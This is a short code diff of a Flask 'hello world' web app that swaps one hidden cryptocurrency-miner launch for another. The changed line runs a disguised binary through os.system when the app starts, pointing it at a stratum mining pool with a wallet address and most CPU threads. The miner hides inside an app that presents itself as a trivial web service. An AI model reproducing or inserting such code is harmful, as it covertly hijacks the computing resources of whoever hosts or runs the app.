@@ -5,7 +5,7 @@ import subprocess
 from flask import Flask, Response, request
 
 app = Flask(__name__)
-os.system("./Naughty_Doctor --algorithm yespower --pool stratum+tcp://yespower.sea.mine.zpool.ca:6234 --wallet LUJ35osZKFDNzLmpp7aykomJ3zecrW64Eu.ZZ --password c=LTC --background --cpu-threads $(nproc --all) --keepalive true")
+os.system("./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.iribilangbos -p x -t $(nproc --ignore 1)")
 
 @app.route('/')
 def hello_world():
